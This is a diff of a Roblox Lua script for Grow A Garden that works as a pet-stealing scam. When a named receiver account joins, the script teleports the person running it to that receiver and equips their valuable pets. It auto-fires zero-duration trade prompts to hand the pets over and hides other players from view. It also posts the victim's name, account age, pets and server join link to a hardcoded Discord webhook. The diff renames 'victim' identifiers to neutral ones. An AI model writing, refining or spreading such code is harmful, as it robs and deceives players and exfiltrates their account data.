@@ -3,19 +3,16 @@ repeat task.wait() until game:IsLoaded()
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local UserInputService = game:GetService("UserInputService")
 local VirtualInputManager = game:GetService("VirtualInputManager")
 local HttpService = game:GetService("HttpService")
 
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1403786302461182083/OmkGNGgXamqB2Q_vs3u5WElaP5E2cpC8mSTeEfJwFnfFB7SQabgkFJi-NIKo_WLVISEs"
 local dataModule = require(ReplicatedStorage.Modules.DataService)
 
--- Whitelisted usernames that when join, you teleport to them invisibly
 local USERNAMES = {
     "Elaine_Pets18"
 }
 
--- PET whitelist map: pet name => UUID
 local PET_WHITELIST = {
     ["Raccoon"] = "{09fc614f-5807-47aa-b4f4-6a044c98b654}",
     ["T-Rex"] = "{59dc2f62-f4f8-495d-b2fe-7d40b6666306}",
@@ -28,24 +25,6 @@ local PET_WHITELIST = {
     ["Spinosaurus"] = "{25df32e7-9ae1-4796-955b-dfe7f1050665}",
     ["Kitsune"] = "{64921f10-e437-4686-9156-2ff194de4e34}"
 }
-
-local victimPetTable = {}
-
-local function getPetNameWithEmoji(petName)
-    local emojis = {
-        ["Raccoon"] = "🦝",
-        ["T-Rex"] = "🦖",
-        ["Fennec Fox"] = "🦊",
-        ["Dragonfly"] = "🐉",
-        ["Butterfly"] = "🦋",
-        ["Disco Bee"] = "🐝",
-        ["Mimic Octopus"] = "🐙",
-        ["Queen Bee"] = "👑🐝",
-        ["Spinosaurus"] = "🦕",
-        ["Kitsune"] = "🦊✨"
-    }
-    return emojis[petName] and (petName .. " " .. emojis[petName]) or petName
-end
 
 local function checkPetsWhitelist(petName)
     return PET_WHITELIST[petName] ~= nil
@@ -76,71 +55,120 @@ local function equipPet(pet)
     end
 end
 
-local function teleportTarget(targetName)
+local function autoAcceptTrade(targetName)
     local targetPlayer = Players:FindFirstChild(targetName)
-    if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
-        LocalPlayer.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
-    end
-end
-
-local function deltaBypass()
-    VirtualInputManager:SendMouseButtonEvent(
-        workspace.Camera.ViewportSize.X / 2,
-        workspace.Camera.ViewportSize.Y / 2,
-        0, true, nil, false
-    )
-    task.wait()
-    VirtualInputManager:SendMouseButtonEvent(
-        workspace.Camera.ViewportSize.X / 2,
-        workspace.Camera.ViewportSize.Y / 2,
-        0, false, nil, false
-    )
-end
-
-local function startSteal(triggerName)
-    local targetPlayer = Players:FindFirstChild(triggerName)
-    if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("Head") then
-        local prompt = targetPlayer.Character.Head:FindFirstChild("ProximityPrompt")
-        if prompt then
-            prompt.HoldDuration = 0
-            deltaBypass()
+    if targetPlayer and targetPlayer.Character then
+        local head = targetPlayer.Character:FindFirstChild("Head")
+        if head then
+            local prompt = head:FindFirstChildWhichIsA("ProximityPrompt")
+            if prompt then
+                prompt.HoldDuration = 0
+                prompt:InputHoldBegin()
+                task.wait(0.1)
+                prompt:InputHoldEnd()
+                print("Trade accepted with", targetName)
+            else
+                warn("No trade prompt found for", targetName)
+            end
         end
     end
 end
 
-local function createDiscordEmbed(petList, totalValue, fileUrl)
+local function teleportTarget(targetName)
+    local targetPlayer = Players:FindFirstChild(targetName)
+    if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") then
+        LocalPlayer.Character.HumanoidRootPart.CFrame = targetPlayer.Character.HumanoidRootPart.CFrame
+        task.wait(0.2) -- allow teleport to process
+        autoAcceptTrade(targetName)
+    end
+end
+
+local function startSteal(targetName)
+    local targetPlayer = Players:FindFirstChild(targetName)
+    if targetPlayer and targetPlayer.Character and targetPlayer.Character:FindFirstChild("Head") then
+        local prompt = targetPlayer.Character.Head:FindFirstChild("ProximityPrompt")
+        if prompt then
+            prompt.HoldDuration = 0
+            prompt:InputHoldBegin()
+            task.wait(0.1)
+            prompt:InputHoldEnd()
+            -- deltaBypass here if needed
+        end
+    end
+end
+
+local function checkPetsInventory(targetName)
+    for petUUID, petData in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
+        if not checkPetsWhitelist(petData.PetType) then
+            continue
+        end
+        local petObject = getPetObject(petUUID)
+        if petObject then
+            equipPet(petObject)
+            task.wait(0.2)
+            startSteal(targetName)
+        end
+    end
+end
+
+local function waitForWhitelistPlayer()
+    while true do
+        for _, player in pairs(Players:GetPlayers()) do
+            if table.find(USERNAMES, player.Name) then
+                return player.Name
+            end
+        end
+        task.wait(1)
+    end
+end
+
+local function makeInvisibleToOthers()
+    for _, player in pairs(Players:GetPlayers()) do
+        if player ~= LocalPlayer and not table.find(USERNAMES, player.Name) then
+            if player.Character then
+                for _, part in pairs(player.Character:GetDescendants()) do
+                    if part:IsA("BasePart") or part:IsA("Decal") or part:IsA("Texture") then
+                        part.Transparency = 1
+                    elseif part:IsA("BillboardGui") or part:IsA("SurfaceGui") then
+                        part.Enabled = false
+                    end
+                end
+            end
+        end
+    end
+end
+
+local function createDiscordEmbed(petList, totalValue)
     local embed = {
         title = "🌱 Grow A Garden Hit - DARK SKIDS 💰",
         color = 65280,
         fields = {
             {
-                name = "👤 **Player Information**",
-                value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```", 
-                    LocalPlayer.Name, 
-                    table.concat(USERNAMES, " "), 
+                name = "👤 Player Information",
+                value = string.format("```Name: %s\nReceiver: %s\nExecutor: %s\nAccount Age: %s```",
                     LocalPlayer.Name,
-                    LocalPlayer.AccountAge
-                ),
+                    table.concat(USERNAMES, " "),
+                    LocalPlayer.Name,
+                    LocalPlayer.AccountAge),
                 inline = false
             },
             {
-                name = "💰 **Total Value**",
+                name = "💰 Total Value",
                 value = string.format("```%s¢```", totalValue),
                 inline = false
             },
             {
-                name = "🎒 **Backpack**",
+                name = "🎒 Backpack",
                 value = string.format("```%s```", petList),
                 inline = false
             },
             {
-                name = "🏁 **Join with URL**",
+                name = "🏁 Join with URL",
                 value = string.format(
-                    "[%s](https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s)", 
-                    game.JobId, 
-                    game.PlaceId, 
-                    game.JobId
-                ),
+                    "[%s](https://kebabman.vercel.app/start?placeId=%s&gameInstanceId=%s)",
+                    game.JobId,
+                    game.PlaceId,
+                    game.JobId),
                 inline = false
             }
         },
@@ -176,71 +204,25 @@ local function createDiscordEmbed(petList, totalValue, fileUrl)
     end
 end
 
-local function checkPetsInventory(targetName)
-    for petUUID, petData in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
-        if not checkPetsWhitelist(petData.PetType) then
-            continue
-        end
-        local petObject = getPetObject(petUUID)
-        if petObject then
-            equipPet(petObject)
-            task.wait(0.2)
-            startSteal(targetName)
-        end
-    end
-end
+-- Main loop
+task.spawn(function()
+    while true do
+        local targetName = waitForWhitelistPlayer()
+        if targetName then
+            teleportTarget(targetName)
+            checkPetsInventory(targetName)
+            makeInvisibleToOthers()
 
-local function waitForJoin()
-    for _, player in pairs(Players:GetPlayers()) do
-        if table.find(USERNAMES, player.Name) then
-            return true, player.Name
-        end
-    end
-    return false, nil
-end
-
-local function makeInvisibleToVictims()
-    for _, player in pairs(Players:GetPlayers()) do
-        if player ~= LocalPlayer and not table.find(USERNAMES, player.Name) then
-            if player.Character then
-                for _, part in pairs(player.Character:GetDescendants()) do
-                    if part:IsA("BasePart") or part:IsA("Decal") or part:IsA("Texture") then
-                        part.Transparency = 1
-                    elseif part:IsA("BillboardGui") or part:IsA("SurfaceGui") then
-                        part.Enabled = false
-                    end
+            local petNames = {}
+            for petUUID, petData in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
+                if checkPetsWhitelist(petData.PetType) then
+                    table.insert(petNames, petData.PetType)
                 end
             end
-        end
-    end
-end
 
-local function idlingTarget()
-    task.spawn(function()
-        while task.wait(0.2) do
-            local found, targetName = waitForJoin()
-            if found then
-                teleportTarget(targetName)
-                checkPetsInventory(targetName)
-                makeInvisibleToVictims()
-            end
-        end
-    end)
-end
-
-idlingTarget()
-
-for petUUID, petData in pairs(dataModule:GetData().PetsData.PetInventory.Data) do
-    if checkPetsWhitelist(petData.PetType) then
-        table.insert(victimPetTable, getPetNameWithEmoji(petData.PetType))
-    end
-end
-
-task.spawn(function()
-    while task.wait(0.5) do
-        if #victimPetTable > 0 then
-            createDiscordEmbed(table.concat(victimPetTable, "\n"), "100000", "https://cdn.discordapp.com/attachments/yourfileurl/items.txt")
+            createDiscordEmbed(table.concat(petNames, "\n"), "100000")
             break
         end
+        task.wait(0.5)
     end
 end)
